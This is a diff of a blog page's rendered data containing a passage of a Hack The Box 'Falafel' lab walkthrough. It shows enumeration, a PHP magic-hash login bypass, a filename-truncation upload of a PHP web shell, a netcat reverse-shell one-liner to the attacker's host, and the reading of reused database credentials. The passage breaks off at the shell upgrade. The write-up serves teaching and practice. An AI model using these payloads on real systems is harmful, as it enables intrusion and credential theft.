@@ -1,18 +1,19 @@
 1:"$Sreact.fragment"
-2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],""]
-3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeToggle"]
-4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"MobileNavigation"]
-f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ArticleReadingGuide"]
-11:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-196f6e2bf5f3439c.js"],"ThemeAutoReset"]
-13:I[484,[],"OutletBoundary"]
-14:"$Sreact.suspense"
-0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Falafel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"PHP type juggling bypasses the admin login and filename truncation turns an upload into a web shell, followed by reused credentials, framebuffer capture and disk-group access to the root SSH key."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:16:55.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[16," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-falafel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Falafel machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Falafel machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","data-motion":"section","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","children":["$L5","$L6","$L7",["$L8","$L9"]]}],"$La"]}]]}],null,"$Lb"]}],"$Lc","$Ld"],null,"$Le"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"DK8DoHECLNCy57ryKFrJF"}
-5:["$","$Lf",null,{"headings":[{"id":"phase-0-before-starting","label":"Phase 0: Before Starting"},{"id":"phase-1-reconnaissance-mapping-the-attack-surface","label":"Phase 1: Reconnaissance - Mapping the Attack Surface"},{"id":"phase-2-web-enumeration-reading-the-signs","label":"Phase 2: Web Enumeration - Reading the Signs"},{"id":"phase-3-authentication-recon-finding-the-cracks","label":"Phase 3: Authentication Recon - Finding the Cracks"},{"id":"phase-4-php-type-juggling-the-magic-hash-attack","label":"Phase 4: PHP Type Juggling - The Magic Hash Attack"},{"id":"phase-5-file-upload-exploitation-filename-truncation","label":"Phase 5: File Upload Exploitation - Filename Truncation"},{"id":"phase-6-initial-access-catching-a-shell","label":"Phase 6: Initial Access - Catching a Shell"},{"id":"phase-7-privilege-escalation-to-moshe-credential-reuse","label":"Phase 7: Privilege Escalation to Moshe - Credential Reuse"},{"id":"phase-8-privilege-escalation-to-yossi-the-framebuffer","label":"Phase 8: Privilege Escalation to Yossi - The Framebuffer"},{"id":"phase-9-privilege-escalation-to-root-the-disk-group","label":"Phase 9: Privilege Escalation to Root - The Disk Group"},{"id":"key-lessons-and-takeaways","label":"Key Lessons & Takeaways"}]}]
-6:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/1e33a051efd110570ea1dda27f465f991b082c9a/HTB-Falafel.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 1e33a051efd1",""]}]]]}]
-7:["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Falafel, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]
-8:["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-9:["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"10 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-10:T794e,<p><strong>Target IP:</strong> <code>10.129.229.139</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>OS:</strong> Linux (Ubuntu)<br><strong>Difficulty:</strong> Hard<br><strong>Flags:</strong></p>
+2:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],""]
+3:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeToggle"]
+4:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"MobileNavigation"]
+10:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ArticleReadingGuide"]
+12:I[2372,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-c900f5ec9cac0f8d.js"],"ThemeAutoReset"]
+14:I[484,[],"OutletBoundary"]
+15:"$Sreact.suspense"
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L2","/about",{"href":"/about","children":"About"}],["$","$L2","/projects",{"href":"/projects","children":"Projects"}],["$","$L2","/research",{"href":"/research","children":"Research"}],["$","$L2","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L2","/services",{"href":"/services","children":"Services"}],["$","$L2","/contact",{"href":"/contact","children":"Contact"}]]}],["$","$L3",null,{}],["$","$L2",null,{"className":"utility-link","href":"/contact#professional-enquiries","children":["Contact Abdullah ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"items":[{"label":"About","href":"/about"},{"label":"Projects","href":"/projects"},{"label":"Research","href":"/research"},{"label":"Writing","href":"/writing"},{"label":"Services","href":"/services"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","div",null,{"className":"article-hero-copy","data-motion":"hero","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Falafel Walkthrough"}],["$","p",null,{"className":"article-dek","children":"PHP type juggling bypasses the admin login and filename truncation turns an upload into a web shell, followed by reused credentials, framebuffer capture and disk-group access to the root SSH key."}],["$","aside",null,{"className":"article-signal-deck article-signal-deck-htb","data-article-signal-kind":"lab","data-motion-surface":"instrument","aria-label":"Article orientation","children":[null,[["$","div",null,{"className":"article-signal-lab-node","aria-hidden":"true","children":[["$","span",null,{}],["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}]]}],["$","div",null,{"className":"article-signal-heading article-signal-lab-identity","children":[["$","span",null,{"children":"Authorized retired lab"}],["$","strong",null,{"children":"Falafel"}],"$L5","$L6"]}],"$L7","$L8"],null,null]}]]}],"$L9"]}],"$La","$Lb"]}],null,"$Lc"]}],"$Ld","$Le"],null,"$Lf"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"MVJfiMbnmqcLVn86bgJ_V"}
+5:["$","small",null,{"children":"Hack The Box machine record"}]
+6:["$","a",null,{"className":"article-signal-source","href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open public machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]
+7:["$","dl",null,{"className":"article-signal-metrics article-signal-lab-metrics","children":[["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Operating system"}],["$","dd",null,{"children":"Linux"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Difficulty"}],["$","dd",null,{"children":"Hard"}]]}],["$","div",null,{"className":"article-signal-metric article-signal-metric-lab-state","children":[["$","dt",null,{"children":"Machine state"}],["$","dd",null,{"children":"Retired"}]]}],["$","div",null,{"className":"article-signal-metric","children":[["$","dt",null,{"children":"Retirement verified"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-07-12","children":"12 Jul 2026"}]}]]}]]}]
+8:["$","p",null,{"className":"article-signal-byline","children":["Published ","11 Jun 2026"," · ","Abdullah Kareem"]}]
+9:["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-falafel-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Falafel machine avatar","loading":"lazy","decoding":"async","fetchPriority":"low"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Falafel machine artwork, used for identification. Hack The Box is not affiliated with CyberKareem."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/falafel","target":"_blank","rel":"nofollow noopener noreferrer","children":["Official Hack The Box machine page"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]
+a:["$","div",null,{"className":"article-rule"}]
+11:T833a,<p><strong>Target IP:</strong> <code>10.129.229.139</code><br><strong>Attacker IP:</strong> <code>10.10.16.84</code><br><strong>OS:</strong> Linux (Ubuntu)<br><strong>Difficulty:</strong> Hard<br><strong>Flags:</strong></p>
 <ul>
 <li>User: <code>1e909[redacted]5bf217a</code></li>
 <li>Root: <code>cc38a05[redacted]b3341cd5</code></li>
@@ -36,7 +37,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <hr>
 <h2 id="phase-1-reconnaissance-mapping-the-attack-surface">Phase 1: Reconnaissance - Mapping the Attack Surface</h2>
 
-<pre><code class="language-bash" data-language="bash">nmap -sS -sC -sV -p- 10.129.229.139
+<pre tabindex="0" aria-label="bash code or terminal block 1"><code class="language-bash" data-language="bash">nmap -sS -sC -sV -p- 10.129.229.139
 </code></pre>
 <h3 id="breaking-it-down-baby-steps">Breaking It Down (Baby Steps)</h3>
 <table tabindex="0" aria-label="Breaking It Down (Baby Steps) data table">
@@ -69,7 +70,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 </tr>
 </tbody></table>
 <h3 id="the-results">The Results</h3>
-<pre><code>PORT   STATE SERVICE VERSION
+<pre tabindex="0" aria-label="Code or terminal block 2"><code>PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
 </code></pre>
@@ -77,7 +78,7 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 <p><strong>Two services.</strong> That's it. This immediately tells us something important: <strong>the web application is the primary attack vector.</strong> SSH is almost certainly for later - either for credential reuse after we find passwords, or for a more stable shell once we have credentials.</p>
 <p><strong>Why does this matter?</strong> Because on a hard box with only two ports, the web app is where 90% of the work happens. We don't waste time looking for exotic kernel exploits or hidden services. We focus our energy on the HTTP service.</p>
 <p><strong>Additional Recon:</strong></p>
-<pre><code class="language-bash" data-language="bash">nmap -sC -sV -p 80,22 -oA nmap/scripts 10.129.229.139
+<pre tabindex="0" aria-label="bash code or terminal block 3"><code class="language-bash" data-language="bash">nmap -sC -sV -p 80,22 -oA nmap/scripts 10.129.229.139
 </code></pre>
 <p>This saves output in multiple formats (<code>-oA</code>) for documentation and future reference. Professional hackers document everything - you never know when you'll need to come back to a box.</p>
 <hr>
@@ -91,14 +92,14 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 </ul>
 <p> The <code>.php</code> extension tells us the backend is PHP. This is critical because PHP has specific vulnerability classes (type juggling, file inclusion, unsafe serialization) that Python or Node.js apps don't have.</p>
 <h3 id="step-2b-check-robots-txt">Step 2B: Check robots.txt</h3>
-<pre><code class="language-bash" data-language="bash">curl http://10.129.229.139/robots.txt
+<pre tabindex="0" aria-label="bash code or terminal block 4"><code class="language-bash" data-language="bash">curl http://10.129.229.139/robots.txt
 </code></pre>
 <p>Result:</p>
-<pre><code>/*.txt
+<pre tabindex="0" aria-label="Code or terminal block 5"><code>/*.txt
 </code></pre>
 <p> <code>robots.txt</code> is not a security control - it is an <em>invitation</em>. The developer is saying "please don't look at .txt files." A hacker's immediate response is: <strong>I am absolutely going to look at .txt files.</strong> This is like a sign that says "Do not enter" on an unlocked door.</p>
 <h3 id="step-2c-directory-brute-forcing">Step 2C: Directory Brute-Forcing</h3>
-<pre><code class="language-bash" data-language="bash">ffuf -u http://10.129.229.139/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<pre tabindex="0" aria-label="bash code or terminal block 6"><code class="language-bash" data-language="bash">ffuf -u http://10.129.229.139/FUZZ -ic -e .txt,.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 </code></pre>
 <p><strong>Why these extensions?</strong></p>
 <ul>
@@ -141,10 +142,10 @@ f:I[8945,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app
 </tr>
 </tbody></table>
 <h3 id="step-2d-read-cyberlaw-txt">Step 2D: Read cyberlaw.txt</h3>
-<pre><code class="language-bash" data-language="bash">curl http://10.129.229.139/cyberlaw.txt
+<pre tabindex="0" aria-label="bash code or terminal block 7"><code class="language-bash" data-language="bash">curl http://10.129.229.139/cyberlaw.txt
 </code></pre>
 <p>Result:</p>
-<pre><code>From: Falafel Network Admin (admin@falafel.htb)
+<pre tabindex="0" aria-label="Code or terminal block 8"><code>From: Falafel Network Admin (admin@falafel.htb)
 Subject: URGENT!! MALICIOUS SITE TAKE OVER!
 ...
 A user named "chris" has informed me that he could log into MY account
@@ -184,7 +185,7 @@ Dear develpors, fix this broken site ASAP.
 </ol>
 <p>This two-step process is a classic pattern - and a classic mistake. It gives us binary feedback (username exists / doesn't exist), which is the foundation for blind SQL injection attacks.</p>
 <h3 id="step-3b-username-enumeration-with-wfuzz">Step 3B: Username Enumeration with wfuzz</h3>
-<pre><code class="language-bash" data-language="bash">wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
+<pre tabindex="0" aria-label="bash code or terminal block 9"><code class="language-bash" data-language="bash">wfuzz -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
   -d "username=FUZZ&amp;password=REDACTED" \
   -u http://10.129.229.139/login.php --hh 7074
 </code></pre>
@@ -196,7 +197,7 @@ Dear develpors, fix this broken site ASAP.
 <li><code>--hh 7074</code> = hide responses with 7074 characters (the "Try again" response for invalid users)</li>
 </ul>
 <p><strong>Results:</strong></p>
-<pre><code>admin   (response size different)
+<pre tabindex="0" aria-label="Code or terminal block 10"><code>admin   (response size different)
 chris   (response size different)
 </code></pre>
 <p> We now know two valid accounts: <code>admin</code> and <code>chris</code>. We also know the application responds differently based on username validity. This confirms our hypothesis about the two-step authentication process.</p>
@@ -206,14 +207,14 @@ chris   (response size different)
 <h3 id="understanding-the-vulnerability">Understanding the Vulnerability</h3>
 <p>PHP has a feature called <strong>type juggling</strong>. When you use a loose comparison operator (<code>==</code>), PHP tries to automatically convert variables to compatible types before comparing them. This is different from strict comparison (<code>===</code>), which checks both value <em>and</em> type.</p>
 <p><strong>Example:</strong></p>
-<pre><code class="language-php" data-language="php">var_dump("0e123456" == "0e987654");  // bool(true)
+<pre tabindex="0" aria-label="php code or terminal block 11"><code class="language-php" data-language="php">var_dump("0e123456" == "0e987654");  // bool(true)
 var_dump("0e123456" === "0e987654"); // bool(false)
 </code></pre>
 <p><strong>Why is the first one true?</strong>
 PHP sees strings that start with <code>0e</code> followed by digits. It interprets these as <strong>scientific notation</strong> (0 × 10^anything = 0). Both sides evaluate to the float <code>0.0</code>, so <code>0.0 == 0.0</code> is <code>true</code>.</p>
 <h3 id="how-does-this-apply-to-password-hashing">How Does This Apply to Password Hashing?</h3>
 <p>Many PHP applications store MD5 password hashes and compare them like this:</p>
-<pre><code class="language-php" data-language="php">if ($stored_hash == md5($user_password)) {
+<pre tabindex="0" aria-label="php code or terminal block 12"><code class="language-php" data-language="php">if ($stored_hash == md5($user_password)) {
     login_successful();
 }
 </code></pre>
@@ -233,7 +234,7 @@ PHP sees strings that start with <code>0e</code> followed by digits. It interpre
 </tbody></table>
 <p>Any hash starting with <code>0e</code> and containing only digits after it will be interpreted as <code>0.0</code> in PHP.</p>
 <h3 id="step-4a-test-the-magic-hash-login">Step 4A: Test the Magic Hash Login</h3>
-<pre><code class="language-bash" data-language="bash">curl -s -X POST -d "username=admin&amp;password=REDACTED" \
+<pre tabindex="0" aria-label="bash code or terminal block 13"><code class="language-bash" data-language="bash">curl -s -X POST -d "username=admin&amp;password=REDACTED" \
   -c cookies.txt http://10.129.229.139/login.php | grep -i "upload"
 </code></pre>
 <p><strong>Result:</strong> We see links to <code>upload.php</code>, <code>profile.php</code>, and <code>logout.php</code>. <strong>We are authenticated as admin.</strong></p>
@@ -259,7 +260,7 @@ PHP sees strings that start with <code>0e</code> followed by digits. It interpre
 <li>The file is now saved as <code>longname.php</code></li>
 </ol>
 <h3 id="step-5a-create-the-webshell">Step 5A: Create the Webshell</h3>
-<pre><code class="language-bash" data-language="bash">cd /tmp
+<pre tabindex="0" aria-label="bash code or terminal block 14"><code class="language-bash" data-language="bash">cd /tmp
 echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; $(python3 -c 'print("A"*232 + ".php.png")')
 </code></pre>
 <p><strong>Why 232 A's?</strong></p>
@@ -269,18 +270,18 @@ echo '&lt;?php system($_REQUEST["cmd"]); ?&gt;' &gt; $(python3 -c 'print("A"*232
 <li>The math: we want the final saved name to be <code>A*232.php</code> (236 chars total), so the <code>.png</code> gets truncated</li>
 </ul>
 <h3 id="step-5b-start-a-local-web-server">Step 5B: Start a Local Web Server</h3>
-<pre><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 8081
+<pre tabindex="0" aria-label="bash code or terminal block 15"><code class="language-bash" data-language="bash">cd /tmp &amp;&amp; python3 -m http.server 8081
 </code></pre>
 <p><strong>Why?</strong> The target server fetches the file from our machine. We need to host it.</p>
 <h3 id="step-5c-submit-the-upload">Step 5C: Submit the Upload</h3>
-<pre><code class="language-bash" data-language="bash">cd /tmp
+<pre tabindex="0" aria-label="bash code or terminal block 16"><code class="language-bash" data-language="bash">cd /tmp
 FILENAME=$(python3 -c 'print("A"*232 + ".php.png")')
 curl -s -b cookies.txt -X POST \
   -d "url=http://10.10.16.84:8081/$FILENAME" \
   http://10.129.229.139/upload.php | grep -E "CMD|New name|uploads/"
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code>CMD: cd /var/www/html/uploads/0531-1954_30d7e3e4cc82c58e; wget 'http://10.10.16.84:8081/AAAA...AAAA.php.png'
+<pre tabindex="0" aria-label="Code or terminal block 17"><code>CMD: cd /var/www/html/uploads/0531-1954_30d7e3e4cc82c58e; wget 'http://10.10.16.84:8081/AAAA...AAAA.php.png'
 New name is AAAAAAAAA...AAAAAAAA.php.
 </code></pre>
 <p><strong>Notice the dot at the end!</strong> The <code>.png</code> was truncated. The file is now <code>.php.</code> (the trailing dot is just how the output formats it).</p>
@@ -293,19 +294,19 @@ New name is AAAAAAAAA...AAAAAAAA.php.
 <hr>
 <h2 id="phase-6-initial-access-catching-a-shell">Phase 6: Initial Access - Catching a Shell</h2>
 <h3 id="step-6a-test-code-execution">Step 6A: Test Code Execution</h3>
-<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=id"
+<pre tabindex="0" aria-label="bash code or terminal block 18"><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=id"
 </code></pre>
 <p><strong>Result:</strong> <code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
 <h3 id="step-6b-upgrade-to-reverse-shell">Step 6B: Upgrade to Reverse Shell</h3>
 <p>A webshell is fine for single commands, but we want an interactive shell for exploring the system, running <code>su</code>, and generally having a better time.</p>
 <p><strong>Start a listener on Kali:</strong></p>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 4444
+<pre tabindex="0" aria-label="bash code or terminal block 19"><code class="language-bash" data-language="bash">nc -lnvp 4444
 </code></pre>
 <p><strong>Trigger the reverse shell:</strong></p>
-<pre><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.84%204444%20%3E%2Ftmp%2Ff"
+<pre tabindex="0" aria-label="bash code or terminal block 20"><code class="language-bash" data-language="bash">curl -s "http://10.129.229.139/uploads/0531-1954_30d7e3e4cc82c58e/AAAAAAAA...AAAAAAAA.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.16.84%204444%20%3E%2Ftmp%2Ff"
 </code></pre>
 <p><strong>Decoded payload:</strong></p>
-<pre><code class="language-bash" data-language="bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.84 4444 &gt; /tmp/f
+<pre tabindex="0" aria-label="bash code or terminal block 21"><code class="language-bash" data-language="bash">rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.16.84 4444 &gt; /tmp/f
 </code></pre>
 <p><strong>How this works:</strong></p>
 <ol>
@@ -317,7 +318,7 @@ New name is AAAAAAAAA...AAAAAAAA.php.
 <li>This creates a full duplex communication channel</li>
 </ol>
 <p><strong>Result on Kali:</strong></p>
-<pre><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.229.139] 45290
+<pre tabindex="0" aria-label="Code or terminal block 22"><code>connect to [10.10.16.84] from (UNKNOWN) [10.129.229.139] 45290
 /bin/sh: 0: can't access tty; job control turned off
 $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -326,10 +327,10 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <hr>
 <h2 id="phase-7-privilege-escalation-to-moshe-credential-reuse">Phase 7: Privilege Escalation to Moshe - Credential Reuse</h2>
 <h3 id="step-7a-read-web-application-files">Step 7A: Read Web Application Files</h3>
-<pre><code class="language-bash" data-language="bash">cat /var/www/html/connection.php
+<pre tabindex="0" aria-label="bash code or terminal block 23"><code class="language-bash" data-language="bash">cat /var/www/html/connection.php
 </code></pre>
 <p><strong>Result:</strong></p>
-<pre><code class="language-php" data-language="php">&lt;?php
+<pre tabindex="0" aria-label="php code or terminal block 24"><code class="language-php" data-language="php">&lt;?php
    define('DB_SERVER', 'localhost:3306');
    define('DB_USERNAME', 'moshe');
    define('DB_PASSWORD', 'falafelIsReallyTasty');
@@ -339,48 +340,48 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 <p>Credential reuse made the database password worth testing against the local <code>moshe</code> account.</p>
 <h3 id="step-7b-upgrade-the-shell">Step 7B: Upgrade the Shell</h3>
 <p>Basic <code>nc</code> shells are "dumb" - they don't handle TTY properly, so <code>su</code> won't work directly.</p>
-<pre><code class="language-bash" data-language="bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
